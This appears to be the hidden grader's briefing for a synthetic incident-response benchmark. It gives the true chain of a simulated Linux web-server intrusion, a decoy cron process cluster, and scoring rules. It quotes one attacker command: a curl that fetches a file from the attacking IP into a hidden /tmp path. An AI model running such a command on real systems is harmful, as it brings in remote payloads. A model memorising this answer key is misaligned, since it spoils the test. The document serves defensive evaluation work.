# Briefing: single-host-linux-rce

Human-readable ground truth. Do not share with the agent-under-test.

## True chain of events

1. **Recon (~02:06 UTC).** External IP `154.16.92.201` runs a nikto-style
   web scan against the public application server APP-01
   (`api.thornburyanalytics.com`, `45.61.18.5:80`) — ~40 requests over
   ~2 minutes.
2. **Exploitation (~02:17 UTC).** The same external IP sends a crafted POST
   to `/admin/config/import` on the same host; the app returns `200`.
   Immediately after, a shell process (`/bin/sh -c id`) runs as `www-data`,
   confirming code execution as the web service account.
3. **Ingress tool transfer (~02:24 UTC).** `www-data` runs
   `curl -s http://154.16.92.201/dl/pkg-47a1 -o /tmp/.cache-47a1`, fetching a
   file from the same external host seen in recon and exploitation.

No persistence, privilege escalation, lateral movement, or exfiltration is
modeled in this scenario — it ends at the ingress fetch.

## Decoy: rh-nightly-maintenance (~03:29-03:31 UTC)

`svc-deploy` runs a python -> sh -> gzip process cluster
(`nightly_archive.py` -> `archive_release.sh` -> `gzip`) that superficially
resembles the attack's process shape (script -> shell -> tool). It is
**not** part of the incident.

Distinguishing evidence:
- Different account: `svc-deploy`, not `www-data`.
- No preceding external HTTP request.
- No outbound network connection at all.
- Different (cron/deploy) parent lineage, not the web worker.
- Recurs as a scheduled pattern (three near-identical occurrences), not a
  one-off attacker action.

A correct answer explicitly rules this cluster in or out with reasons. A
generic "suspicious process activity, recommend escalation" answer that
doesn't engage with why it is or isn't part of the incident should not get
credit for this discrimination.

## Undetermined by design

- **Second-stage payload contents.** Never captured on the wire (plain HTTP,
  but no response body/file evidence modeled for this specific transfer).
  Any answer asserting what `pkg-47a1` actually contains is over-claiming.
- **The specific vulnerability / CVE.** EvidenceForge does not model
  application-level vulnerabilities (see the generator's README). The
  evidence supports "an exploit against the config-import endpoint yielded
  code execution as www-data." It does not support naming a specific
  deserialization bug, CVE, or vulnerability class as confirmed fact.
  Reasonable *hypotheses* framed as such are fine; assertions of fact are
  not.

## Known evidence quirks (engine artifacts, not part of the story)

Full detail in `supporting/KNOWN_DEFICIENCIES.md`. The one most likely to
confuse a grader: the RCE process chain intentionally uses only
`/bin/sh -c id` (a single process event) rather than two separately-parented
`sh` and `id` processes — this was a deliberate authoring workaround for an
engine parent-resolution limitation, not a gap in the story. Don't expect or
require the AUT to find a two-process id sequence.
